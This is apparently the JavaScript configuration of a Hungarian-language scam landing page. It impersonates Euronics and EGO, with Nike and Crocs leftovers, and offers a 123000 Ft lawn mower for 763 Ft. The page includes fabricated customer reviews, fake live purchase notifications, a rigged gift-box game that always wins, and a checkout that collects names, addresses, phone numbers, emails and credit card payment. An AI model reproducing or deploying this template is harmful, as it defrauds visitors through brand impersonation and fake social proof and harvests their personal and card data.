const orderHref = window.__order_href;
const orderOriginParam = window.__origin_param;

const baseUrl = document.querySelector("base[href]")?.href;
const baseHref = window.location.protocol + '//' + window.location.host;

const landingUrl = baseHref + window.location.pathname;
const imageBase = (baseUrl ?? landingUrl).replace(/\/index\.html$/, '');

(function (exp) {
  const countryCode = "hu";
  const lang = "hu-HU";
  const locale = lang;

  const sizes = {
    enabled: false,
    selectText: "MÉRET: ",
    arr: [
      "EU 36",
      "EU 37",
      "EU 37.5",
      "EU 38",
      "EU 38.5",
      "EU 39",
      "EU 39.5",
      "EU 40",
      "EU 40.5",
      "EU 41",
      "EU 41.5",
      "EU 42",
      "EU 42.5",
      "EU 43",
      "EU 43.5",
      "EU 44",
      "EU 44.5",
      "EU 45",
      "EU 45.5",
      "EU 46",
      "EU 46.5",
      "EU 47",
      "EU 47.5",
      "EU 48",
      "EU 49",
      "EU 50",
      "EU 51",
      "EU 52",
    ]
  };

  const bottomRow = {
    bar: "menü",
    account: "Bejelentkezés",
    heart: "Kívánságlista",
    bag: "Kosár",
    find: "Keresés"
  };

  const mainProduct = {
    header: "Korlátozott ajánlat",
    name: "EGO 21in önjáró akkumulátoros fűnyíró",
    oldPrice: "123000 Ft",
    newPrice: "763 Ft",
    selectText: "SZÍN: ",
    text: `Ha módot keres arra, hogy kisebb rendetlenséggel, kisebb szénlábnyommal és kipufogógázok nélkül nyírja a gyepet, az EGO 21 hüvelykes, 56 V-os lítium-ion akkumulátoros, 7,5 Ah-s és töltővel ellátott önjáró fűnyíró szett ideális megoldás. Az összes nyomatékkal, amit egy hagyományos benzines motor kínál, ez az önjáró fűnyíró megkönnyíti a munkát a legkeményebb fűnyírási körülmények között.
`,
  };

  const notifications = [
    {
      user: "Manuel S*****",
      location: "Barcelona, Spanyolország",
      action: "Most kaptam meg a fapapucsomat 1,95 euróért!",
      timeago: "15 másodperccel ezelőtt",
    },
    {
      user: "Carlos B******",
      location: "Madrid, Spanyolország",
      action: "Most kaptam meg a fapapucsomat 1,95 euróért!",
      timeago: "25 másodperccel ezelőtt",
    },
  ];

  const reviewsArr = [
    {
      name: "Matthieu",
      time: "Egy nappal ezelőtt",
      header: "Ez hihetetlen!",
      review: "Régóta álmodtam egy új fűnyíró vásárlásáról, mert a régi elromlott. Köszönöm Euronics az akciót!",
      image: "./index_files/review1.jpg",
      rating: 100,
    },
    {
      name: "Lucas",
      time: "Két nappal ezelőtt",
      header: "Nagyszerű! Nincs szavam.",
      review: "Megkaptam az EGO fűnyírómat, még jobban néz ki, mint a képen!",
      image: "./index_files/review5.jpg",
      rating: 100,
    },
    {
      name: "Valentina",
      time: "Két nappal ezelőtt",
      header: "Egyszerűen nagyszerű.",
      review: "A férjem ellenezte a részvételemet, mert nem hallottunk erről az akcióról, de amikor megkaptam a csomagot, nagyon boldog volt.",
      image: "./index_files/review2.jpg",
      rating: 93,
    },
    {
      name: "Santiago",
      time: "Négy nappal ezelőtt",
      header: "Tetszik",
      review: "Csak nézd meg a gyepemet, gyönyörű. Köszönöm EGO és Euronics ezt az ajándékot.",
      image: "./index_files/review4.jpg",
      rating: 90,
    },
    {
      name: "Martina",
      time: "Hét nappal ezelőtt",
      header: "Wow, imádom ezt a terméket!",
      review: "Ez a legjobb fűnyíró, amit valaha vettem, nagyon jó minőségű és az értékelések szerint tartós. Köszönöm ezt az akciót.",
      image: "./index_files/review3.jpg",
      rating: 80,
    },
  ];

  const reviews = {
    reviews: reviewsArr,
    rr: "VÉLEMÉNYEK ÉS ÉRTÉKELÉSEK",
    percent: "99%",
    rec: "Megjegyzések ehhez az akcióhoz",
  };

  const questions = {
    _of: "Kérdés {1} a {2}-ból: ",
    arr: [
      {
        q: "Vásárolt már a Euronics-nál?",
        a: [
          "Igen, vásároltam",
          "Nem, soha nem vásároltam",
        ],
      },
      {
        q: "Honnan értesült erről az ajánlatról?",
        a: ["A hivatalos weboldalon", "Reklám a Facebookon", "Barátok mondták"],
      },
      {
        q: "Miért vásárol fűnyírót?",
        a: ["Személyes használatra", "Ajándékba"],
      },
    ],
  };

  const check = {
    title: "A válasza ellenőrzésre kerül...",
    arr: [
      "Ön válaszolt a 3/3 kérdésre.",
      "Az IP-címe nem teszi lehetővé, hogy következtetéseket vonjunk le korábbi kéréseiről.",
      "A válasza ellenőrzésre került.",
    ],
  };

  const modals = {
    welcome: {
      texts: {
        header: "Gratulálunk, megerősítette, hogy valós személy",
        button: "OK",
        text: `
      <center>
      Ma, {date}, lehetősége van Nike Air Force 1'07 párt vásárolni speciális áron
        <br><br>
        Minden, amit tennie kell, az a megfelelő ajándékdoboz kiválasztása.
        <br><br>
        Három próbálkozása van, sok szerencsét!
      </center>
      `,
      },
    },
    first: {
      texts: {
        header: "Ó, ne...",
        button: "OK",
        text: `
      <center>
      Sajnos ez az ajándék üres! Még 2 próbálkozása van - sok szerencsét!
      </center>
      `,
      },
    },
    win: {
      texts: {
        header: "Gratulálunk! Nyertél!",
        button: "OK",
        text: `
      <center>
        <p style="color: #000">
        Ön nyert egy pár "Nike Air Force 1'07" cipőt
        </p>
        <br>
        1) Kattintson az "OK" gombra, és lépjen a szállítási oldalra.
        <br><br>
        2) Töltse ki az űrlapot, és fizesse ki a megrendelést a személyes kedvezményével.
        <br><br>
        3) A csomag 2-3 napon belül megérkezik.
      </center>
      `,
      },
    },
  };

  const cartSteps = {
    personal: {
      title: "Személyes adatok",
      fields: {
        name: {
          enabled: true,
          field: "Név",
        },
        family: {
          enabled: true,
          field: "Vezetéknév",
        },
        phone: {
          enabled: true,
          field: "Telefonszám",
        },
        email: {
          enabled: true,
          field: "Email cím",
        },
      },
    },
    delivery: {
      title: "Szállítás",
      fields: {
        city: {
          enabled: true,
          field: "Város",
        },
        address: {
          enabled: true,
          field: "Szállítási cím",
        },
        zip: {
          enabled: true,
          field: "Irányítószám",
        },
      },
    },
    payment: {
      title: "Fizetési módok",
      creditCard: "Online fizetés hitelkártyával",
    },
  };

  const cart = {
    steps: cartSteps,
    main: {
      title: "Rendelési részletek",
      oldPrice: "123000 Ft",
      newPrice: "763 Ft",
      size: "Méret",
      subTotal: {
        title: "Részösszeg",
        amount: "763 Ft",
      },
      delivery: {
        title: "Szállítás",
        amount: "Ft 0.00",
      },
      total: {
        title: "Összesen",
        amount: "763 Ft",
      },
      checkoutButton: "Rendelés kifizetése",
    },
  };



  const products = [
    {
      id: "26468781",
      name: "Noir",
      miniImg: "./index_files/img/item1/item1.jpg",
      images: [
        "./index_files/img/item1/item1.jpg",
        "./index_files/img/item1/item2.jpg",
        "./index_files/img/item1/item3.jpg",
        "./index_files/img/item1/item4.jpg",
        "./index_files/img/item1/item5.jpg",
        // "./index_files/img/item1/item6.jpg",
        "./index_files/img/item1/item7.jpg",
        // "./index_files/img/item1/item8.jpg",
        // "./index_files/img/item1/item9.jpg",
      ],
    },
  ];

  const footer = {
    cr: "© Crocs™ | Copyright 2024 | Tous droits réservés",
  };


  const pathImgBox = {
    lid: "./index_files/box-lid.png",
    lidIOs: "./index_files/box-lid-ios.png",
    inner: "./index_files/box-inner.png",
    innerGift: "./index_files/box-inner-gift.png",
    box: "./index_files/box.png",
    boxModal: "./index_files/box-modal.png",
  };

  exp.__config = {
    pathImgBox,
    countryCode,
    lang,
    locale,
    mainProduct,
    footer,
    check,
    questions,
    modals,
    cart,
    reviews,
    products,
    sizes,
    notifications,
    bottomRow
  };
})(window);

window.addEventListener("load", () => {
  for (let path of Object.values(window.__config.pathImgBox)) {
    let link = document.createElement("link");
    link.setAttribute("as", "image");
    link.setAttribute("href", path);
    link.rel = "preload";
    document.head.appendChild(link);
  }
});

const lsSelectProduct = (val) =>
  localStorage.setItem("__selected_product", val);

const lsGetSelectedProduct = () => {
  const products = window.__config.products;
  let ind = localStorage.getItem("__selected_product");

  if (ind == null) {
    ind = products[0].id;
    lsSelectProduct(ind);
  }
  const product = products.find((pr) => pr.id === ind);
  const mainProduct = window.__config.mainProduct;

  const localImageUrl = product.images[0].replace("./", "");
  const imageUrl = imageBase + localImageUrl;

  document.querySelector("input[name='product_name']").value = `${mainProduct.name}: ${product.name}`;
  document.querySelector("input[name='product_image']").value = imageUrl;
  // console.log(localImageUrl);
  // console.log(imageUrl);

  return product;
};

const lsGetSelectedProductInd = () => {
  return lsGetSelectedProduct().id;
};

const lsSelectSize = (val) =>
  localStorage.setItem("__selected_size", val);
const lsGetSelectedSizeInd = () => {
  const ind = localStorage.getItem("__selected_size");
  let v = parseInt(ind);

  if (isNaN(v)) {
    v = 0;
    lsSelectSize(v);
  }

  return v;
};
const lsGetSelectedSize = () => {
  const sizes = window.__config.sizes;
  const selectedSize = sizes.arr?.[lsGetSelectedSizeInd()];
  document.querySelector("input[name='product_size']").value = selectedSize;

  return selectedSize;
};

const lsGetProductImages = () => {
  return lsGetSelectedProduct()?.images ?? [];
};

const lsSetStep = (val) => localStorage.setItem("__step", val);
const lsGetStep = () => {
  const step = localStorage.getItem("__step", val);

  console.log(step);

  if (step != null) return step;

  lsSetStep("main");
  return "main";
};

const getProductById = (id) => {
  const products = window.__config.products;

  return products.find((pr) => pr.id === id);
};

const enableLoader = () => {
  const loader = document.querySelector(".loader");
  loader.setAttribute("style", "display: flex");
};
const disableLoader = () => {
  const loader = document.querySelector(".loader");
  loader.setAttribute("style", "display: none");
};

const openMain = () => {
  document.querySelector("#main").setAttribute("style", "display: block");
};
const closeMain = () => {
  document.querySelector("#main").setAttribute("style", "display: none");
};

const openGame = () => {
  document.querySelector("#game").setAttribute("style", "display: block");
};
const closeGame = () => {
  document.querySelector("#game").setAttribute("style", "display: none");
};

const openCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: block");
};
const closeCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: none");
};

document.querySelector("form").addEventListener("submit", (e) => {
  document.querySelector("#submitButton").setAttribute("disabled", "true");
  const spinner = document.createElement("div");
  spinner.classList.add("spinner__", "submitButton");
  document.querySelector("#submitButton").appendChild(spinner);
});
